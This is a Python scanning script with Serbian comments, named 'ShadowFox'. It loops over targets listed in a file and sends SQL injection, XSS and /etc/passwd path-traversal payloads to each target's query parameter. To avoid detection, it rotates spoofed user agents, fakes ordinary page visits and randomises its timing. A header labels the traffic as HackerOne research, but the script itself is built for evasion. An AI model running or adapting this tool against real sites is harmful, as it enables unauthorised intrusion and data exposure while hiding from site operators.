# foxstrike_mimic_pro.py
import requests
import random
import time
import signal
import sys
import os

# — SIGINT prekid — #
def sigint_handler(sig, frame):
    print("\n[!] Prekid detektovan – zatvaram ShadowFox.")
    sys.exit(0)
signal.signal(signal.SIGINT, sigint_handler)

# — Adaptive stealth headers — #
def prepare_headers(target):
    return {
        "User-Agent": random.choice([
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/112.0.0.0 Safari/537.36"
        ]),
        "Accept-Language": random.choice(["en-US", "en", "sr"]),
        "Referer": target,
        "X-Requested-With": "XMLHttpRequest",
        "X-HackerOne-Research": "Whitefox980H1_Base64: V2hpdGVmb3g5ODBIMQ=="
    }
# — Mimikrija korisnika — #
def stealth_behavior(target):
    paths = ["/", "/about", "/contact", "/search?q=help"]
    fake_url = target.rstrip("/") + random.choice(paths)
    try:
        requests.get(fake_url, headers=prepare_headers(target), timeout=5)
        time.sleep(random.randint(6, 12))
    except:
        pass

# — Payload liste — #
default_payloads = [
    "' OR '1'='1",
    "<script>alert(1)</script>",
    "<img src=x onerror=alert('xss')>",
    "../../../etc/passwd"
]

import argparse

# Argument parser
parser = argparse.ArgumentParser()
parser.add_argument("--payload", help="Custom payload to use", type=str)
args = parser.parse_args()

# Payload lista (dinamička ili default)
stealth_payloads = [args.payload] if args.payload else [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert('xss')>",
    "' OR '1'='1",
    "../../../etc/passwd"
]
# — CSP detekcija — #
def has_csp(target):
    try:
        r = requests.get(target, headers=prepare_headers(target), timeout=5)
        return 'content-security-policy' in r.headers or 'Content-Security-Policy' in r.headers
    except:
        return False

# — Detekcija tipa — #
def detect_type(payload):
    if "script" in payload or "onerror" in payload:
        return "XSS"
    elif "OR '1" in payload:
        return "SQLi"
    elif "../" in payload or "passwd" in payload:
        return "LFI"
    else:
        return "Other"

# — Glavna funkcija po meti — #
def run_shadowfox_mimic(target):
    print(f"\n[ShadowFox10.2 :: STELT MISIJA] {target}")
    stealth_behavior(target)

    payloads = stealth_payloads if has_csp(target) else default_payloads

    for p in payloads:
        if os.path.exists("STOP_FOX"):
            print("[!] STOP_FOX signal detektovan – prekid misije.")
            sys.exit(0)

        full_url = f"{target}?q={p}"
        try:
            r = requests.get(full_url, headers=prepare_headers(target), timeout=7)
            print(f"[{r.status_code} :: {detect_type(p)}] {full_url}")
            time.sleep(random.uniform(2.5, 4.0))
        except Exception as e:
            print(f"[ERROR] {full_url} → {str(e)}")

# — CLI pokretanje — #
if __name__ == "__main__":
    try:
        with open("targets.txt") as f:
            targets = [l.strip() for l in f if l.strip()]
        for t in targets:
            run_shadowfox_mimic(t)
    except KeyboardInterrupt:
        print("\n[!] CTRL+C detektovan – lisica se povlači.")
        sys.exit(0)
